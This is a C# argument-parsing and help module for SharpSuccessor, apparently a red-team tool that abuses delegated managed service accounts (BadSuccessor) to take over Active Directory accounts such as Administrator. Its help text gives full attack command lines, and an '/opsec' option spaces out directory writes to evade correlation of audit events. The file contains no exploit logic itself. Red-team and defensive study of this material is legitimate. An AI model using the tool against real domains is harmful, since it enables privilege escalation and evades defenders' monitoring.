using System;
using System.Collections.Generic;
using System.Linq;

namespace SharpSuccessor.Modules
{
    internal class ArgParse
    {
        private static readonly HashSet<string> sMods =
            new HashSet<string>(StringComparer.OrdinalIgnoreCase) { "add", "remove" };

        public static void Help()
        {
            string help =
                "[*] add    Create and weaponize a dMSA object (BadSuccessor), then write the\n" +
                "           superseded-account attributes on the account you want to take over.\n\n" +
                "    SharpSuccessor.exe add /impersonate:Administrator /path:\"ou=test,dc=lab,dc=lan\" \\\n" +
                "                          /account:jdoe /name:attacker_dMSA\n\n" +
                "      Required: /impersonate  Account to take over (superseded target).\n" +
                "                /path         DN of the OU the caller can CreateChild in.\n" +
                "                /account      Principal granted read access to the dMSA password.\n" +
                "                /name         Name of the dMSA object to create.\n\n" +
                "[*] remove Clean up: clear the superseded-account attributes on the target and\n" +
                "           delete the dMSA object (for authorized engagement teardown).\n\n" +
                "    SharpSuccessor.exe remove /impersonate:Administrator /path:\"ou=test,dc=lab,dc=lan\" \\\n" +
                "                             /name:attacker_dMSA\n\n" +
                "      Required: /impersonate  Account whose attributes should be reset.\n" +
                "                /path         DN of the OU the dMSA was created in.\n" +
                "                /name         Name of the dMSA object to delete.\n\n" +
                "    Optional (both commands):\n" +
                "      /dc            Target a specific domain controller (host or IP).\n" +
                "      /username      Bind with explicit credentials (DOMAIN\\user or user@domain).\n" +
                "      /password      Password for /username.\n" +
                "      /opsec         Insert a randomized delay (default 30-180s) between the two\n" +
                "                     directory writes to decorrelate the 5137/5136 events.\n" +
                "      /delay:<n>     Override the delay: /delay:90 (fixed) or /delay:30-180 (range),\n" +
                "                     in seconds. Implies /opsec.\n";
            Console.WriteLine(help);
        }

        // Adapted from Rubeus https://github.com/GhostPack/Rubeus/blob/master/Rubeus/Domain/ArgumentParser.cs#L8
        public static Dictionary<string, string> Parse(IEnumerable<string> args)
        {
            var arguments = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            foreach (var argument in args)
            {
                var idx = argument.IndexOf(':');
                if (idx < 0) idx = argument.IndexOf('=');

                if (idx > 0)
                {
                    arguments[argument.Substring(0, idx)] = argument.Substring(idx + 1);
                }
                else
                {
                    arguments[argument] = string.Empty;
                }
            }
            return arguments;
        }

        // Accepts "<seconds>" (fixed) or "<min>-<max>" (random range), in seconds.
        private static bool ParseDelay(string value, Options o)
        {
            int dash = value.IndexOf('-');
            if (dash < 0)
            {
                int secs;
                if (!int.TryParse(value.Trim(), out secs) || secs < 0) return false;
                o.DelayMinSeconds = secs;
                o.DelayMaxSeconds = secs;
                return true;
            }

            int min, max;
            if (!int.TryParse(value.Substring(0, dash).Trim(), out min) ||
                !int.TryParse(value.Substring(dash + 1).Trim(), out max) ||
                min < 0 || max < min)
            {
                return false;
            }
            o.DelayMinSeconds = min;
            o.DelayMaxSeconds = max;
            return true;
        }

        public static int Execute(string[] args)
        {
            if (args.Length == 0 || !sMods.Contains(args.First()))
            {
                Help();
                return args.Length == 0 ? 0 : 1;
            }

            if (args.Length == 1)
            {
                Help();
                return 1;
            }

            string command = args.First().ToLower();
            Dictionary<string, string> cmd = Parse(args.Skip(1));

            var o = new Options();
            cmd.TryGetValue("/account", out o.Account);
            cmd.TryGetValue("/impersonate", out o.Impersonate);
            cmd.TryGetValue("/path", out o.Path);
            cmd.TryGetValue("/name", out o.Name);
            cmd.TryGetValue("/dc", out o.Dc);
            cmd.TryGetValue("/username", out o.Username);
            cmd.TryGetValue("/password", out o.Password);

            o.Opsec = cmd.ContainsKey("/opsec");
            string delay;
            if (cmd.TryGetValue("/delay", out delay) && !string.IsNullOrEmpty(delay))
            {
                if (!ParseDelay(delay, o))
                {
                    Console.WriteLine("[!] Invalid /delay value '" + delay + "'. Use /delay:<seconds> or /delay:<min>-<max>.");
                    return 1;
                }
                o.Opsec = true; // specifying a delay implies opsec timing
            }

            var missing = new List<string>();
            if (string.IsNullOrEmpty(o.Impersonate)) missing.Add("/impersonate");
            if (string.IsNullOrEmpty(o.Path)) missing.Add("/path");
            if (string.IsNullOrEmpty(o.Name)) missing.Add("/name");
            if (command == "add" && string.IsNullOrEmpty(o.Account)) missing.Add("/account");

            if (missing.Count > 0)
            {
                Console.WriteLine("[!] Missing required arguments: " + string.Join(", ", missing));
                Console.WriteLine("[!] See help menu for more information.\n");
                Help();
                return 1;
            }

            if (!string.IsNullOrEmpty(o.Username) && o.Password == null)
            {
                Console.WriteLine("[!] /username was supplied without /password.");
                return 1;
            }

            switch (command)
            {
                case "add": return dMSA.Weaponize(o);
                case "remove": return dMSA.Remove(o);
                default:
                    Help();
                    return 1;
            }
        }
    }
}
